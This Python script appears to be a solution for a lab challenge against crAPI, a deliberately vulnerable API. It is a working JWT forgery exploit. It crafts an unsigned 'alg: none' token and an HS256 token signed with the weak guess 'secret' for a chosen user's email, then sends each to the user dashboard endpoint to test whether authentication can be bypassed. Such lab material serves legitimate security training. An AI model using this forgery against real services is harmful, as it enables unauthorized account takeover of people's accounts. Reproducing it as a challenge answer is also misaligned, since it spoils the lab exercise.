#!/usr/bin/env python3
"""Challenge 15: Forge valid JWT tokens"""
import argparse, sys, base64, json, random
from pathlib import Path
from typing import Optional
import requests, yaml

def load_config(path: str) -> dict:
    with open(path, "r") as f:
        return yaml.safe_load(f)

def b64url_encode(data: str) -> str:
    return base64.urlsafe_b64encode(json.dumps(data).encode()).rstrip(b"=").decode()

def create_unsigned_jwt(sub: str, alg: str = "none") -> str:
    header = {"alg": alg, "typ": "JWT"}
    payload = {"sub": sub, "iat": 1234567890, "exp": 9999999999, "role": "user"}
    token = f"{b64url_encode(header)}.{b64url_encode(payload)}"
    return token + "."

def create_hs256_jwt(sub: str, secret: str) -> str:
    import hmac
    header = {"alg": "HS256", "typ": "JWT"}
    payload = {"sub": sub, "iat": 1234567890, "exp": 9999999999, "role": "user"}
    msg = f"{b64url_encode(header)}.{b64url_encode(payload)}".encode()
    sig = hmac.new(secret.encode(), msg, 'sha256').digest()
    sig_b64 = base64.urlsafe_b64encode(sig).rstrip(b"=").decode()
    return f"{b64url_encode(header)}.{b64url_encode(payload)}.{sig_b64}"

def test_jwt(base_url: str, token: str, timeout: float = 15) -> Optional[dict]:
    headers = {"Authorization": f"Bearer {token}"}
    try:
        r = requests.get(f"{base_url.rstrip('/')}/identity/api/v2/user/dashboard",
                        headers=headers, timeout=timeout)
        if r.status_code == 200:
            return r.json()
    except:
        pass
    return None

def main():
    parser = argparse.ArgumentParser(description="Challenge 15: JWT Forgery")
    parser.add_argument("--config", default="../crapi_config.yaml")
    parser.add_argument("--target-email")
    args = parser.parse_args()

    cfg = load_config(Path(args.config))
    base_url = cfg["target"]["base_url"]
    num_users = cfg.get("num_users", 50)

    print(f"[*] Challenge 15: JWT Forgery\n[*] Target: {base_url}\n" + "-"*60)

    if not args.target_email:
        args.target_email = f"mike{random.randint(1, num_users)}@my.lab"
    print(f"[+] Target user: {args.target_email}\n")

    print(f"\n[1] Creating unsigned JWT (alg: none)...")
    unsigned_token = create_unsigned_jwt(args.target_email, "none")
    print(f"[+] Token: {unsigned_token[:50]}...")

    dashboard = test_jwt(base_url, unsigned_token)
    if dashboard:
        print(f"[+] SUCCESS! Unsigned JWT accepted!")
        print(f"[+] Dashboard: {dashboard}")
        print(f"[!] VULNERABLE: Accepts unsigned JWT tokens")
        return

    print(f"\n[2] Creating HS256 JWT...")
    hs256_token = create_hs256_jwt(args.target_email, "secret")
    print(f"[+] Token: {hs256_token[:50]}...")

    dashboard = test_jwt(base_url, hs256_token)
    if dashboard:
        print(f"[+] SUCCESS! HS256 JWT accepted!")
        print(f"[!] VULNERABLE: JWT signature validation may be bypassed")
        return

    print(f"\n[!] Could not forge JWT - may need public key or other techniques")

if __name__ == "__main__":
    main()
